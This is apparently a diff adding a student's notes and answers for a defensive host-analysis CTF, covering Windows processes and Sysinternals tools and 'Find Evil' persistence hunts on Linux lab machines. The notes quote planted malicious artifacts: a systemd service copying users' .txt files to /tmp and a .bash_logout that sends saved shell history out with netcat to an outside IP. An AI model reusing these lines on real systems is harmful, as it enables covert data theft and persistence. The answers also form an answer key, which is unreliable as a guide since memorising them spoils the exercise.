@@ -487,3 +487,412 @@ netstat -anob | more
 ```
 #andy.dwyer@ADMIN-STATION C:\Users\andy.dwyer>netstat -anob | more
 
+# CTF-DAY6
+
+### What is the full path to folder used when Windows redirects 32 bit applications running on a 64bit system?
+-C:\Windows\SysWOW64
+
+### What Windows System Service starts the kernel and user mode subsystems?
+-smss.exe
+
+
+### What Windows system process:
+Runs in session 0
+is responsible for enforcing the security policy on the system
+Performs all logon functions
+Handles password changes
+Creates access tokens
+Writes to the Windows Security Log
+-LSASS
+
+
+### Which service type is explorer.exe?
+-User-mode service
+
+### During a network survey you observed a host running inetinfo.exe service. What type of server might you have found?
+-IIS *(If you observed a host running inetinfo.exe service, it likely indicates that the host is running a Microsoft Internet Information Services (IIS) server.)
+
+### During a reconnaissance mission you enumerated a host running the dns.exe service. Is this a user pc or a server?
+-Server *(If you encountered a host running the dns.exe service, it's more likely to be a server)
+
+### A host running firefox and office 365 is most likely what type of host? Server or Client
+-Client
+
+### How does a User-Mode Service request resources?
+-Sytem calls *(User-mode services request resources through system calls to the operating system kernel.)
+
+### Passively copying currently running processes for comparison later is known as?
+-Baselining
+
+### What can execute any part of a processes code, to include parts already being executed?
+-Thread
+
+### Windows has how many process priority levels?
+-32 *(0-31)
+
+### What Sysinternals tool shows malware persistence locations in tabs within its GUI?
+-Autoruns
+
+### What Sysinternals tool is used to investigate processes?
+-Process Explorer
+
+### What Sysinternals tool can be used to investigate network connection attempts?
+-TCPView
+
+### What Sysinternals tool can view permissions?
+-AccessChk
+
+### What Sysinternals tool allows us to view and modify handles?
+-Handle
+
+### What is the default Windows user directory for files downloaded from the internet? The flag is the folder name only.
+-Downloads
+
+### What is the default Windows download directory that everyone has access to? The flag is the absolute path to the directory.
+-C:\Users\Public\Downloads
+
+### What Sysinternals tool shows service load order?
+-LoadOrder
+
+### What is the service name of Windows Defender Firewall?
+-mpssvc
+
+### What SysInternals tool reports .dlls loaded into processes?
+-ListDLLs
+
+
+### There is malware on the system that is named similarly to a legitimate Windows executable. There is a .dll in the folder that the malware runs from. The flag is the name of the .dll.
+-cd C:\Documents and Settings\Public\Downloads
+dir
+check for mispelling errors
+DLL above suspicious .exe
+
+### You notice that there is an annoying pop up happening regularly. Investigate the process causing it. The flag is the name of the executable.
+
+run
+
+```
+Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+```
+To find the executables runing in the machine for every user
+Then run 
+```
+Get-Process | Select-Object -Property ProcessName, Path | Format-Table -AutoSize
+```
+Go check the .exe that matches with the HKLM Key
+
+### Malware uses names of legit processes to obfuscate itself. Give the flag located in Kerberos’ registry subkey.
+
+Win+R Regedit, Ctl+F Kerberos, keep looking until flag 76aGreX5 pops up.
+
+### A nonstandard port has been opened by possible malware on the system. Identify the port.
+
+Machine: Workstation1 (RDP from Admin-Station)
+login: student
+password: password
+```
+netstat -ano | find "LISTENING"
+```
+Determine what mechanism opened the port from hidden_processes_7. The flag is the name of the file.
+
+Hint: The file is not legit.
+
+Machine: Workstation1 (RDP from Admin-Station)
+login: student
+password: password
+
+Open process explorer ctl+f powershell go to image and command line 
+
+What command-line (cmd) command will show all services, running or not running?
+sc query
+
+What command-line (cmd) command will show all services, running or not running?
+sc queryex type= service state= all
+
+What PowerShell command will list all services?
+Get-Service
+
+
+Get-Service | Where-Object { $_.DisplayName -eq "Totally-Legit" } | Select-Object Name, DisplayName
+
+Identify the file that contains udp connection information. Identify the process using port 123.
+
+For the flag, enter:
+
+Process name
+File descriptor number for the udp socket
+Its permissions as shown in lsof
+ChatGPT
+To identify the file that contains UDP connection information and the process using port 123, you can use the lsof command. Here's how you can do it:
+
+Identify the file containing UDP connection information for port 123:
+
+sh
+Copy code
+```
+sudo lsof -i UDP:123
+```
+Record the process name, file descriptor number for the UDP socket, and its permissions:
+
+The output of the lsof command will display the process name, file descriptor number, and permissions for the UDP socket associated with port 123.
+Flag Format:
+
+￼Copy code
+ProcessName FileDescriptorNumber PermissionsShownInLsof
+Replace ProcessName, FileDescriptorNumber, and PermissionsShownInLsof with the actual values obtained from the lsof command.
+
+For example, if the process name is example_process, the file descriptor number is 5, and the permissions shown in lsof are rw, the flag would be:
+
+￼Copy code
+example_process 5 rw
+
+
+
+
+To locate a strange open port on a SysV system, you can use the netstat command to list all open ports and then inspect the list for any unusual or unexpected ports. Here's how you can do it:
+
+Open a terminal on your SysV system.
+
+Run the following command to list all open ports:
+
+￼Copy code
+netstat -tuln
+
+# FIND EVIL 1
+
+
+
+Scenario: The Villains group has been chanting offerings to their new leader at regular intervals over a TCP connection.
+
+Task: Identify their method of communication and how it is occurring. Locate the following artifacts: ** The chant/text used by each villain (include spaces) ** The new Lord receiving the offering ** The IP address and port that the offering is received over
+
+Flag format: chant text,new Lord,IP:port
+
+Machine: Minas_Tirith
+
+
+
+
+htop to find the suspicious user receiving the chants
+
+cat /home/*/offering
+cat /home/*/chant
+
+
+
+# FIND EVIL 2
+
+Scenario: Text files are being exfiltrated from the machine using a network connection. The connections still occur post-reboot, according to network analysts.
+
+The junior analysts are having a hard time with attribution because no strange programs or ports are running, and the connection seems to only occur in 60-second intervals, every 15 minutes.
+
+Task: Determine the means of persistence used by the program, and the port used. The flag is the command that allows exfiltration, and the file its persistence mechanism uses.
+
+Flag format: command,persistence
+
+Machine: Terra
+
+systemctl list-timers
+cat whatischaos.timer 
+cat whatischaos.service
+
+# FIND EVIL 3
+
+Scenario: The web server has been modified by an unknown hacktivist group. Users accessing the web server are reporting crashes and insane disk usage.
+
+Task: Identify the Cyber Attack Method used by the group, and the command running.
+
+Flag format: AttackMethod,command
+
+Machine: Terra
+
+Try not to break your machine on this one...
+
+ps -elf |  grep apache3
+
+
+
+Scenario: Someone or something is stealing files with a .txt extension from user directories. Determine how these thefts are occurring.
+
+Task: Identify the command being ran and how it occurs.
+
+Flag format: command,how it occurs
+
+Machine: Terra
+
+Hint: Explore persistence mechanisms and services.
+
+grep -Rnw / -e "*.txt" 2>/dev/null
+
+garviel@terra:~$ cat /etc/systemd/system/graphical.target.wants/passwd.service #the way that it happens is my passwd.service
+Description=Secrets
+After=network.target auditd.service
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c 'find /home -name \*.txt -exec cp {} /tmp \;' #command, pay attention to arguments
+Restart=no
+
+[Install]
+WantedBy=multi-user.target
+Alias=vestrisecreta.service
+
+# FIND EVIL 5
+
+Scenario: Analysts have found a dump of commands on the Internet that refer to the Terra machine. The command history for one of the users with an interactive login is being stolen via unknown means. The network analysts can’t find any persistent connections, but notice a spike in traffic on logon and logoff.
+
+Task: Identify how the command history is stolen from the machine.
+
+The flag is the file used to execute the commands, and where they are sent.
+
+Flag format: /absolute/path/to/file,IP:port
+
+Machine: Terra
+
+
+cat .bash_logout
+pwd
+
+garviel@terra:~$ cat .bash_logout
+# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+# when leaving the console clear the screen to increase privacy
+
+if [ "$SHLVL" = 1 ]; then
+    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+fi
+history -w /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
+nc -w2 12.54.37.8 12000 < /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
+garviel@terra:~$ pwd 
+/home/garviel #add /.bash_logout
+
+
+
+
+
+
+
+
+
+
+
+### Command line to show hidden files on windows:
+```
+dir /a:h
+```
+```
+dir /a:h /s 
+```
+*(With Subdirectories)
+
+```
+findstr "example"
+```
+Will find a the string example in current dir
+
+```
+findstr "example" C:\Users\Username\Documents\*
+```
+Will find a the string example in specified path 
+
+```
+findstr "example" C:\Users\Username\Documents\* /S
+```
+Will find a the string example in specified path with subdirectories checked for matching too.
+
+```
+netstat -ano 
+```
+```
+netstat -anp
+```
+Enumerate all DLLs
+```
+dir C:\Windows\System32\*.dll
+```
+```
+dir C:\ /s /b /a:-d /a:-h /a:-s /a:-r *.exe
+```
+Explanation of parameters used:
+
+/s: Recursively search all subdirectories.
+/b: Bare format (displays only the file path).
+/a:-d: Excludes directories from the output.
+/a:-h: Excludes hidden files from the output.
+/a:-s: Excludes system files from the output.
+/a:-r: Excludes read-only files from the output.
+*.exe: Filters the results to show only files with a .exe extension.
+
+Using PowerShell:
+```
+Get-ChildItem -Path C:\ -Recurse -File -Filter *.exe | Select-Object -ExpandProperty FullName
+```
+Malware authors often target specific folders and directories on Windows systems where they can install their malicious payloads to maximize the chances of infiltration and persistence. Here are some of the most common locations where malware may be installed:
+
+System Folders:
+
+System32: This folder contains critical system files. Malware may camouflage itself by using names similar to legitimate files or by directly replacing system files.
+SysWOW64: Similar to System32, but for 32-bit applications on 64-bit Windows systems.
+Windows: The Windows directory contains essential system files. Malware may create subdirectories or hide within existing ones to evade detection.
+User Profile Folders:
+
+AppData: This folder, located within each user's profile directory (C:\Users\username\AppData), is a common location for malware as it provides a convenient place to hide executables and configurations. Specifically, the "Roaming" and "Local" subfolders are often targeted.
+Startup: Malware may place executables or shortcuts in the Startup folder (C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup), ensuring persistence by running on system startup.
+Temporary Directories:
+
+Temp: The Windows Temp directory (C:\Windows\Temp) or user-specific Temp directories (C:\Users\username\AppData\Local\Temp) are frequently used by malware to drop temporary files or extract payloads.
+Program Files and Program Files (x86):
+
+Program Files: Malware may attempt to disguise itself by installing in directories commonly used by legitimate applications (C:\Program Files).
+Program Files (x86): On 64-bit systems, malware targeting 32-bit applications may install itself in this directory (C:\Program Files (x86)).
+Root Directories:
+
+Root of the System Drive (e.g., C:): Malware may drop files directly in the root directory to gain visibility and execute from a location that most users have access to.
+Registry:
+
+Run and RunOnce Keys: Malware may create or modify entries in the Windows Registry under "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" and "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" to ensure persistence by running on system startup.
+Browser-related folders:
+
+Browser Extensions and Plugins: Malware targeting web browsers may install malicious browser extensions or plugins in directories specific to the browser being used (e.g., Chrome, Firefox, Edge).
+It's important to regularly monitor these locations for any suspicious activity and to keep antivirus software up to date to detect and remove malware.
+
+
+
+## Find executables and DLLs associated to them: 
+
+To find executables (.exe files) and the dynamic link libraries (DLLs) associated with them in the System32 directory on Windows using the command line, you can utilize the dir command. Here's how you can do it:
+```
+dir C:\Windows\System32\*.exe C:\Windows\System32\*.dll /s /b
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
